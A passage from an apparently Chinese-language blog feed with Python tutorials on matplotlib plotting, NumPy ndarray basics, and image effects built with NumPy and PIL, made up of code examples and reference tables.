<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">plt.plot([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>])</span><br><span class="line">plt.ylabel(<span class="string">&quot;value&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将图像保存成PNG格式</span></span><br><span class="line">plt.savefig(<span class="string">&quot;./test&quot;</span>, dpi=<span class="number">600</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># x值[0,2,4,6,8]; y值[3,1,4,5,2]</span></span><br><span class="line">plt.plot([<span class="number">0</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">8</span>], [<span class="number">3</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">2</span>])</span><br><span class="line">plt.ylabel(<span class="string">&quot;value&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># X轴[-1,10]; Y轴[0,10]</span></span><br><span class="line">plt.axis([-<span class="number">1</span>,<span class="number">10</span>,<span class="number">0</span>,<span class="number">10</span>])</span><br><span class="line"></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<h2 id="plot"><a href="#plot" class="headerlink" title="plot"></a>plot</h2><p><code>plt.plot(x,y,format_string, **kwargs)</code></p>
<ul>
<li>x X轴数据，列表或数组，只有一条曲线的时候可选。</li>
<li>y Y轴数据，列表或数组。</li>
<li>format_string 控制曲线的各式字符串，可选。</li>
<li>kwargs 第二组或更多(x,y,format_string)</li>
</ul>
<p><code>format_string</code>分别由“颜色字符”、“风格字符”、“标记字符”构成</p>
<p>** 颜色字符 **</p>
<table>
<thead>
<tr>
<th align="center">颜色字符</th>
<th align="center">说明</th>
<th align="center">颜色字符</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">‘b’</td>
<td align="center">蓝色</td>
<td align="center">‘m’</td>
<td align="center">洋红色</td>
</tr>
<tr>
<td align="center">‘g’</td>
<td align="center">绿色</td>
<td align="center">‘y’</td>
<td align="center">黄色</td>
</tr>
<tr>
<td align="center">‘r’</td>
<td align="center">红色</td>
<td align="center">‘k’</td>
<td align="center">黑色</td>
</tr>
<tr>
<td align="center">‘c’</td>
<td align="center">青色</td>
<td align="center">‘w’</td>
<td align="center">白色</td>
</tr>
<tr>
<td align="center">‘#008000’</td>
<td align="center">RGB某颜色</td>
<td align="center">‘0.8’</td>
<td align="center">灰度值字符串</td>
</tr>
</tbody></table>
<p>如果用户不指定颜色，系统会自动指定不重复的颜色。</p>
<p>** 风格字符 **</p>
<table>
<thead>
<tr>
<th align="center">风格字符</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">‘-‘</td>
<td align="left">实现</td>
</tr>
<tr>
<td align="center">‘–’</td>
<td align="left">破折线</td>
</tr>
<tr>
<td align="center">‘-.’</td>
<td align="left">点划线</td>
</tr>
<tr>
<td align="center">‘:’</td>
<td align="left">虚线</td>
</tr>
<tr>
<td align="center">‘’</td>
<td align="left">无线条</td>
</tr>
</tbody></table>
<p>*** 更多关于标记内容请见<a href="http://matplotlib.org/api/_as_gen/matplotlib.pyplot.plot.html#matplotlib.pyplot.plot">HERE</a> ***</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">a = np.arange(<span class="number">10</span>)</span><br><span class="line">plt.plot(a,a*<span class="number">1.5</span>,<span class="string">&#x27;go-&#x27;</span>, a,a*<span class="number">2.5</span>,<span class="string">&#x27;rx&#x27;</span>, a,a*<span class="number">3.5</span>,<span class="string">&#x27;*&#x27;</span>, a,a*<span class="number">4.5</span>,<span class="string">&#x27;b-.&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>


<h2 id="分区绘制"><a href="#分区绘制" class="headerlink" title="分区绘制"></a>分区绘制</h2><h3 id="subplot"><a href="#subplot" class="headerlink" title="subplot"></a>subplot</h3><p><code>plt.subplot(nrows, ncols, plot_number)</code> 将绘制区域分割成 nrows x ncols个区域，plot_number指定绘制的是哪个区域</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>(<span class="params">t</span>):</span><br><span class="line">    <span class="keyword">return</span> np.exp(-t) * np.cos(<span class="number">2</span>*np.pi*t)</span><br><span class="line"></span><br><span class="line">a = np.arange(<span class="number">0.0</span>,<span class="number">5.0</span>,<span class="number">2.0</span>)</span><br><span class="line"></span><br><span class="line">plt.subplot(<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">plt.plot(a, f(a))</span><br><span class="line"></span><br><span class="line">plt.subplot(<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>)</span><br><span class="line">plt.plot(a, np.cos(<span class="number">2</span>*np.pi*a), <span class="string">&#x27;r--&#x27;</span>)</span><br><span class="line"></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>


<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="http://www.icourse163.org/learn/BIT-1001870002?tid=1002239009">Python数据分析与展示</a></li>
</ul>
]]></content>
      <categories>
        <category>language</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>matplotlib</tag>
      </tags>
  </entry>
  <entry>
    <title>NumPy + PIL 处理图像</title>
    <url>/2017/11/03/language/python/python-numpy-pillow/</url>
    <content><![CDATA[<ul>
<li><a href="https://zhoubofsy.github.io/2017/11/02/language/python/python-numpy/">NumPy</a></li>
<li>PIL<br>  PIL(Python Image Library)库是一个具有强大图像处理能力的第三方库</li>
</ul>
<h1 id="图像＝-数组"><a href="#图像＝-数组" class="headerlink" title="图像＝&gt;数组"></a>图像＝&gt;数组</h1><p>图像采用的色彩模式为RGB模式，即每个像素点由R（红色）、G（绿色）、B（蓝色）组成。我们人眼所能看到的颜色都是由这三种颜色变化叠加得到的。</p>
<ul>
<li>R红色，取值范围，0～255</li>
<li>G绿色，取值范围，0～255</li>
<li>B蓝色，取值范围，0～255</li>
</ul>
<p>图像是一个由像素组成的二维矩阵，每个元素是一个RGB值。</p>
<h1 id="PIL安装"><a href="#PIL安装" class="headerlink" title="PIL安装"></a>PIL安装</h1><p>OSX: <code>pip install pillow</code></p>
<h1 id="图像处理"><a href="#图像处理" class="headerlink" title="图像处理"></a>图像处理</h1><h2 id="图像加载"><a href="#图像加载" class="headerlink" title="图像加载"></a>图像加载</h2><p><img src="/images/python/turkey_orig.jpg" alt="turkey_orig.jpg"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>img = np.array(Image.<span class="built_in">open</span>(<span class="string">&quot;turkey_orig.jpg&quot;</span>))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>img_l = np.array(Image.<span class="built_in">open</span>(<span class="string">&quot;turkey_orig.jpg&quot;</span>).convert(<span class="string">&#x27;L&#x27;</span>)) </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> img.shape, img.dtype</span><br><span class="line">(<span class="number">1184</span>, <span class="number">2104</span>, <span class="number">3</span>) uint8</span><br><span class="line"><span class="comment"># img是一个三维数组每一个元素代表RGB的一个值</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> img_l.shape, img_l.shape</span><br><span class="line">(<span class="number">1184</span>, <span class="number">2104</span>) uint8</span><br><span class="line"><span class="comment"># img_l是一个二维数组每一个元素对应一个灰度值</span></span><br></pre></td></tr></table></figure>

<h2 id="图像变换"><a href="#图像变换" class="headerlink" title="图像变换"></a>图像变换</h2><h3 id="返选效果"><a href="#返选效果" class="headerlink" title="返选效果"></a>返选效果</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">md_img = [<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>] - img</span><br></pre></td></tr></table></figure>
<p><img src="/images/python/turkey_modify_1.jpg" alt="turkey_modify_1.jpg"></p>
<h3 id="底片效果"><a href="#底片效果" class="headerlink" title="底片效果"></a>底片效果</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">md_img = <span class="number">255</span> - img_l</span><br></pre></td></tr></table></figure>
<p><img src="/images/python/turkey_modify_2.jpg" alt="turkey_modify_2.jpg"></p>
<h3 id="区间变换"><a href="#区间变换" class="headerlink" title="区间变换"></a>区间变换</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">md_img = (<span class="number">100.0</span>/<span class="number">255.0</span>)*img_l + <span class="number">150</span></span><br></pre></td></tr></table></figure>
<p><img src="/images/python/turkey_modify_3.jpg" alt="turkey_modify_3.jpg"></p>
<h3 id="平方变换"><a href="#平方变换" class="headerlink" title="平方变换"></a>平方变换</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">md_img = <span class="number">255</span> * ((img_l/<span class="number">255.0</span>)**<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
<p><img src="/images/python/turkey_modify_4.jpg" alt="turkey_modify_4.jpg"></p>
<h3 id="手绘效果"><a href="#手绘效果" class="headerlink" title="手绘效果"></a>手绘效果</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">img_l_float = img_l.astype(<span class="string">&quot;float&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 深度值，范围为0～100</span></span><br><span class="line">depth = <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取x和y方向的梯度值</span></span><br><span class="line">grad = np.gradient(img_l_float)</span><br><span class="line">grad_x, grad_y = grad</span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据深度调整梯度值</span></span><br><span class="line">grad_x = grad_x*depth/<span class="number">100</span></span><br><span class="line">grad_y = grad_y*depth/<span class="number">100</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 此处计算的是什么？</span></span><br><span class="line">A = np.sqrt(grad_x**<span class="number">2</span> + grad_y**<span class="number">2</span> + <span class="number">1.0</span>)</span><br><span class="line">uni_x = grad_x/A</span><br><span class="line">uni_y = grad_y/A</span><br><span class="line">uni_z = <span class="number">1.0</span>/A</span><br><span class="line"></span><br><span class="line"><span class="comment"># 为什么要引入光源？</span></span><br><span class="line">vec_el = np.pi/<span class="number">2.2</span></span><br><span class="line">vec_az = np.pi/<span class="number">4.0</span></span><br><span class="line">dx = np.cos(vec_el)*np.cos(vec_az)</span><br><span class="line">dy = np.cos(vec_el)*np.sin(vec_az)</span><br><span class="line">dz = np.sin(vec_el)</span><br><span class="line"></span><br><span class="line"><span class="comment">#dx, dy, dz = 1,1,1</span></span><br><span class="line">md_img = <span class="number">255</span>*(dx*uni_x + dy*uni_y + dz*uni_z)</span><br><span class="line">md_img = md_img.clip(<span class="number">0</span>,<span class="number">255</span>)</span><br></pre></td></tr></table></figure>
<p>无光源效果：<br><img src="/images/python/turkey_modify_6.jpg" alt="turkey_modify_6.jpg"></p>
<p>有光源效果：<br><img src="/images/python/turkey_modify_5.jpg" alt="turkey_modify_5.jpg"></p>
<h2 id="图像保存"><a href="#图像保存" class="headerlink" title="图像保存"></a>图像保存</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">save_img = Image.fromarray(md_img.astype(<span class="string">&#x27;uint8&#x27;</span>))</span><br><span class="line">save_img.save(<span class="string">&quot;turkey_modify.jpg&quot;</span>)</span><br></pre></td></tr></table></figure>

<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="http://www.icourse163.org/learn/BIT-1001870002?tid=1002239009">Python数据分析与展示</a></li>
</ul>
]]></content>
      <categories>
        <category>language</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>numpy</tag>
        <tag>pillow</tag>
      </tags>
  </entry>
  <entry>
    <title>NumPy</title>
    <url>/2017/11/02/language/python/python-numpy/</url>
    <content><![CDATA[<p>NumPy是一个开源的Python科学计算基础库</p>
<ul>
<li>强大的N维数据兑现ndarry</li>
<li>广播功能函数</li>
<li>整合C&#x2F;C++&#x2F;Fortran代码的工具</li>
<li>线性代数、傅立叶变换、随机数生成等功能</li>
</ul>
<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>OSX: <code>pip install numpy</code></p>
<h1 id="数组ndarray"><a href="#数组ndarray" class="headerlink" title="数组ndarray"></a>数组ndarray</h1><ul>
<li>实际数据</li>
<li>描述这些数据的元数据（数据的维度、数据类型等）</li>
</ul>
<h2 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h2><table>
<thead>
<tr>
<th align="center">属性</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">ndim</td>
<td align="left">维度的数量</td>
</tr>
<tr>
<td align="center">shape</td>
<td align="left">矩阵的行列数</td>
</tr>
<tr>
<td align="center">size</td>
<td align="left">数组元素个数</td>
</tr>
<tr>
<td align="center">dtype</td>
<td align="left">数组元素的类型</td>
</tr>
<tr>
<td align="center">itemsize</td>
<td align="left">数组元素的大小</td>
</tr>
</tbody></table>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = np.array([[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> a</span><br><span class="line">[[<span class="number">0</span> <span class="number">1</span> <span class="number">2</span> <span class="number">3</span>]</span><br><span class="line"> [<span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span>]]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.dim</span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.shape</span><br><span class="line">(<span class="number">2</span>, <span class="number">4</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.size</span><br><span class="line"><span class="number">8</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.dtype</span><br><span class="line">dtype(<span class="string">&#x27;int64&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.itemsize</span><br><span class="line"><span class="number">8</span></span><br></pre></td></tr></table></figure>

<p>*** ndarray数组可以由非同质对象构成，非同质ndarray元素为对象类型。非同质ndarray对象无法有效发挥NumPy优势，应尽量避免使用。 ***</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = np.array([[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],[<span class="number">1</span>,<span class="number">2</span>]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> b</span><br><span class="line">[<span class="built_in">list</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]) <span class="built_in">list</span>([<span class="number">1</span>, <span class="number">2</span>])]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b.dtype</span><br><span class="line">dtype(<span class="string">&#x27;O&#x27;</span>)  <span class="comment"># &#x27;O&#x27;为对象类型</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b.shape</span><br><span class="line">(<span class="number">2</span>,)</span><br></pre></td></tr></table></figure>

<h2 id="ndarray元素类型"><a href="#ndarray元素类型" class="headerlink" title="ndarray元素类型"></a>ndarray元素类型</h2><table>
<thead>
<tr>
<th align="center">数据类型</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">bool</td>
<td align="left">布尔类型 True or False</td>
</tr>
<tr>
<td align="center">intc</td>
<td align="left">与C语言中的int一致</td>
</tr>
<tr>
<td align="center">intp</td>
<td align="left">与C语言中的size_t一致</td>
</tr>
<tr>
<td align="center">int8</td>
<td align="left">8位长度的整数[-128,127]</td>
</tr>
<tr>
<td align="center">int16</td>
<td align="left">16位长度的整数[-32768,32767]</td>
</tr>
<tr>
<td align="center">int32</td>
<td align="left">32位长度的整数[-2<strong>31,2</strong>31-1]</td>
</tr>
<tr>
<td align="center">int64</td>
<td align="left">64位长度的整数[-2<strong>63,2</strong>63-1]</td>
</tr>
<tr>
<td align="center">uint8</td>
<td align="left">8位无符合整数</td>
</tr>
<tr>
<td align="center">uint16</td>
<td align="left">16位无符号整数</td>
</tr>
<tr>
<td align="center">uint32</td>
<td align="left">32位无符号整数</td>
</tr>
<tr>
<td align="center">uint64</td>
<td align="left">64位无符号整数</td>
</tr>
<tr>
<td align="center">float16</td>
<td align="left">16位半精度浮点数</td>
</tr>
<tr>
<td align="center">float32</td>
<td align="left">32位半精度浮点数</td>
</tr>
<tr>
<td align="center">float64</td>
<td align="left">64位半精度浮点数</td>
</tr>
<tr>
<td align="center">complex64</td>
<td align="left">复数类型，实部和虚部都是32位浮点数</td>
</tr>
<tr>
<td align="center">complex128</td>
<td align="left">复数类型，实部和虚部都是64位浮点数</td>
</tr>
</tbody></table>
<h2 id="ndarray创建"><a href="#ndarray创建" class="headerlink" title="ndarray创建"></a>ndarray创建</h2><h3 id="从Python中的列表、元组等类型创建数组"><a href="#从Python中的列表、元组等类型创建数组" class="headerlink" title="从Python中的列表、元组等类型创建数组"></a>从Python中的列表、元组等类型创建数组</h3><p><code>np.array(list/tuple)</code> or <code>np.array(list/tuple, dtype=np.float32)</code>当<code>np.array</code>不指定dtype时，NumPy将根据数据情况关联一个dtype类型。</p>
<h3 id="使用NumPy中的函数创建数组"><a href="#使用NumPy中的函数创建数组" class="headerlink" title="使用NumPy中的函数创建数组"></a>使用NumPy中的函数创建数组</h3><table>
<thead>
<tr>
<th align="left">函数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">np.arange(n)</td>
<td align="left">返回一个从0到n-1的整数类型数组</td>
</tr>
<tr>
<td align="left">np.ones(shape)</td>
<td align="left">根据shape生成一个全1的数组</td>
</tr>
<tr>
<td align="left">np.zeros(shape)</td>
<td align="left">根据shape生成一个全0的数组</td>
</tr>
<tr>
<td align="left">np.full(shape,val)</td>
<td align="left">根据shape生成一个全val的数组</td>
</tr>
<tr>
<td align="left">np.eye(n)</td>
<td align="left">返回一个n*n的数组，对角线为1，其余为0</td>
</tr>
<tr>
<td align="left">np.ones_like(a)</td>
<td align="left">根据数组a的shape生成一个全1的数组</td>
</tr>
<tr>
<td align="left">np.zeros_like(a)</td>
<td align="left">根据数组a的shape生成一个全0的数组</td>
</tr>
<tr>
<td align="left">np.full_like(a,val)</td>
<td align="left">根据数组a的shape生成一个全val的数组</td>
</tr>
<tr>
<td align="left">np.linspace()</td>
<td align="left">根据起止数据等间距的填充数据，形成数组</td>
</tr>
<tr>
<td align="left">np.concatenate()</td>
<td align="left">将两个或多个数组合并成一个新的数组</td>
</tr>
</tbody></table>
<h4 id="arange"><a href="#arange" class="headerlink" title="arange"></a>arange</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>d = np.arange(<span class="number">10</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> d</span><br><span class="line">[<span class="number">0</span> <span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span> <span class="number">6</span> <span class="number">7</span> <span class="number">8</span> <span class="number">9</span>]</span><br></pre></td></tr></table></figure>

<h4 id="ones-zeros-full"><a href="#ones-zeros-full" class="headerlink" title="ones zeros full"></a>ones zeros full</h4><p><code>ones</code>,<code>zeros</code>生成的数组元素都是浮点数类型(float64)，而<code>full</code>生成的是整数类型。若想要<code>ones</code>和<code>zeros</code>也生成整数类型，增加参数<code>dtype=np.int64</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> np.zeros((<span class="number">3</span>,<span class="number">4</span>))</span><br><span class="line">[[ <span class="number">0.</span>  <span class="number">0.</span>  <span class="number">0.</span>  <span class="number">0.</span>]</span><br><span class="line"> [ <span class="number">0.</span>  <span class="number">0.</span>  <span class="number">0.</span>  <span class="number">0.</span>]</span><br><span class="line"> [ <span class="number">0.</span>  <span class="number">0.</span>  <span class="number">0.</span>  <span class="number">0.</span>]]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> np.ones((<span class="number">3</span>,<span class="number">4</span>))</span><br><span class="line">[[ <span class="number">1.</span>  <span class="number">1.</span>  <span class="number">1.</span>  <span class="number">1.</span>]</span><br><span class="line"> [ <span class="number">1.</span>  <span class="number">1.</span>  <span class="number">1.</span>  <span class="number">1.</span>]</span><br><span class="line"> [ <span class="number">1.</span>  <span class="number">1.</span>  <span class="number">1.</span>  <span class="number">1.</span>]]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> np.full((<span class="number">3</span>,<span class="number">4</span>), <span class="number">8</span>)</span><br><span class="line">[[<span class="number">8</span> <span class="number">8</span> <span class="number">8</span> <span class="number">8</span>]</span><br><span class="line"> [<span class="number">8</span> <span class="number">8</span> <span class="number">8</span> <span class="number">8</span>]</span><br><span class="line"> [<span class="number">8</span> <span class="number">8</span> <span class="number">8</span> <span class="number">8</span>]]</span><br></pre></td></tr></table></figure>

<h4 id="eye"><a href="#eye" class="headerlink" title="eye"></a>eye</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>c = np.eye(<span class="number">5</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> c</span><br><span class="line">[[ <span class="number">1.</span>  <span class="number">0.</span>  <span class="number">0.</span>  <span class="number">0.</span>  <span class="number">0.</span>]</span><br><span class="line"> [ <span class="number">0.</span>  <span class="number">1.</span>  <span class="number">0.</span>  <span class="number">0.</span>  <span class="number">0.</span>]</span><br><span class="line"> [ <span class="number">0.</span>  <span class="number">0.</span>  <span class="number">1.</span>  <span class="number">0.</span>  <span class="number">0.</span>]</span><br><span class="line"> [ <span class="number">0.</span>  <span class="number">0.</span>  <span class="number">0.</span>  <span class="number">1.</span>  <span class="number">0.</span>]</span><br><span class="line"> [ <span class="number">0.</span>  <span class="number">0.</span>  <span class="number">0.</span>  <span class="number">0.</span>  <span class="number">1.</span>]]</span><br></pre></td></tr></table></figure>

<h4 id="linspace"><a href="#linspace" class="headerlink" title="linspace"></a>linspace</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> np.linspace(<span class="number">1</span>,<span class="number">10</span>,<span class="number">4</span>)</span><br><span class="line">[  <span class="number">1.</span>   <span class="number">4.</span>   <span class="number">7.</span>  <span class="number">10.</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> np.linspace(<span class="number">1</span>,<span class="number">10</span>,<span class="number">4</span>, endpoint=<span class="literal">False</span>)</span><br><span class="line">[ <span class="number">1.</span>    <span class="number">3.25</span>  <span class="number">5.5</span>   <span class="number">7.75</span>]</span><br></pre></td></tr></table></figure>

<p><code>endpoint</code>表示最后一个元素10是否作为最后一个元素出现</p>
<h4 id="concatenate"><a href="#concatenate" class="headerlink" title="concatenate"></a>concatenate</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> np.concatenate((c,c))</span><br><span class="line">[[ <span class="number">1.</span>  <span class="number">0.</span>  <span class="number">0.</span>  <span class="number">0.</span>  <span class="number">0.</span>]</span><br><span class="line"> [ <span class="number">0.</span>  <span class="number">1.</span>  <span class="number">0.</span>  <span class="number">0.</span>  <span class="number">0.</span>]</span><br><span class="line"> [ <span class="number">0.</span>  <span class="number">0.</span>  <span class="number">1.</span>  <span class="number">0.</span>  <span class="number">0.</span>]</span><br><span class="line"> [ <span class="number">0.</span>  <span class="number">0.</span>  <span class="number">0.</span>  <span class="number">1.</span>  <span class="number">0.</span>]</span><br><span class="line"> [ <span class="number">0.</span>  <span class="number">0.</span>  <span class="number">0.</span>  <span class="number">0.</span>  <span class="number">1.</span>]</span><br><span class="line"> [ <span class="number">1.</span>  <span class="number">0.</span>  <span class="number">0.</span>  <span class="number">0.</span>  <span class="number">0.</span>]</span><br><span class="line"> [ <span class="number">0.</span>  <span class="number">1.</span>  <span class="number">0.</span>  <span class="number">0.</span>  <span class="number">0.</span>]</span><br><span class="line"> [ <span class="number">0.</span>  <span class="number">0.</span>  <span class="number">1.</span>  <span class="number">0.</span>  <span class="number">0.</span>]</span><br><span class="line"> [ <span class="number">0.</span>  <span class="number">0.</span>  <span class="number">0.</span>  <span class="number">1.</span>  <span class="number">0.</span>]</span><br><span class="line"> [ <span class="number">0.</span>  <span class="number">0.</span>  <span class="number">0.</span>  <span class="number">0.</span>  <span class="number">1.</span>]]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> np.concatenate((c,c)).shape</span><br><span class="line">(<span class="number">10</span>, <span class="number">5</span>)</span><br></pre></td></tr></table></figure>


<h2 id="ndarray维度变换"><a href="#ndarray维度变换" class="headerlink" title="ndarray维度变换"></a>ndarray维度变换</h2><table>
<thead>
<tr>
<th align="left">函数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">.reshape(shape)</td>
<td align="left">不改变数组元素，返回一个shape形状的数组，原数组不变</td>
</tr>
<tr>
<td align="left">.resize(shape)</td>
<td align="left">与reshape功能一般，但修改原数组</td>
</tr>
<tr>
<td align="left">.swapaxes(ax1,ax2)</td>
<td align="left">将数组n个维度中的两个维度进行调换</td>
</tr>
<tr>
<td align="left">.flatten()</td>
<td align="left">对数组进行降维，返回一维数组，原数组不变</td>
</tr>
</tbody></table>
<h3 id="reshape"><a href="#reshape" class="headerlink" title="reshape"></a>reshape</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>f = np.ones((<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> f.reshape((<span class="number">3</span>,<span class="number">8</span>))</span><br><span class="line">[[ <span class="number">1.</span>  <span class="number">1.</span>  <span class="number">1.</span>  <span class="number">1.</span>  <span class="number">1.</span>  <span class="number">1.</span>  <span class="number">1.</span>  <span class="number">1.</span>]</span><br><span class="line"> [ <span class="number">1.</span>  <span class="number">1.</span>  <span class="number">1.</span>  <span class="number">1.</span>  <span class="number">1.</span>  <span class="number">1.</span>  <span class="number">1.</span>  <span class="number">1.</span>]</span><br><span class="line"> [ <span class="number">1.</span>  <span class="number">1.</span>  <span class="number">1.</span>  <span class="number">1.</span>  <span class="number">1.</span>  <span class="number">1.</span>  <span class="number">1.</span>  <span class="number">1.</span>]]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> f</span><br><span class="line">[[[ <span class="number">1.</span>  <span class="number">1.</span>  <span class="number">1.</span>  <span class="number">1.</span>]</span><br><span class="line">  [ <span class="number">1.</span>  <span class="number">1.</span>  <span class="number">1.</span>  <span class="number">1.</span>]</span><br><span class="line">  [ <span class="number">1.</span>  <span class="number">1.</span>  <span class="number">1.</span>  <span class="number">1.</span>]]</span><br><span class="line"></span><br><span class="line"> [[ <span class="number">1.</span>  <span class="number">1.</span>  <span class="number">1.</span>  <span class="number">1.</span>]</span><br><span class="line">  [ <span class="number">1.</span>  <span class="number">1.</span>  <span class="number">1.</span>  <span class="number">1.</span>]</span><br><span class="line">  [ <span class="number">1.</span>  <span class="number">1.</span>  <span class="number">1.</span>  <span class="number">1.</span>]]]</span><br></pre></td></tr></table></figure>

<h3 id="resize"><a href="#resize" class="headerlink" title="resize"></a>resize</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.resize((<span class="number">3</span>,<span class="number">8</span>))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> f</span><br><span class="line">[[ <span class="number">1.</span>  <span class="number">1.</span>  <span class="number">1.</span>  <span class="number">1.</span>  <span class="number">1.</span>  <span class="number">1.</span>  <span class="number">1.</span>  <span class="number">1.</span>]</span><br><span class="line"> [ <span class="number">1.</span>  <span class="number">1.</span>  <span class="number">1.</span>  <span class="number">1.</span>  <span class="number">1.</span>  <span class="number">1.</span>  <span class="number">1.</span>  <span class="number">1.</span>]</span><br><span class="line"> [ <span class="number">1.</span>  <span class="number">1.</span>  <span class="number">1.</span>  <span class="number">1.</span>  <span class="number">1.</span>  <span class="number">1.</span>  <span class="number">1.</span>  <span class="number">1.</span>]]</span><br></pre></td></tr></table></figure>

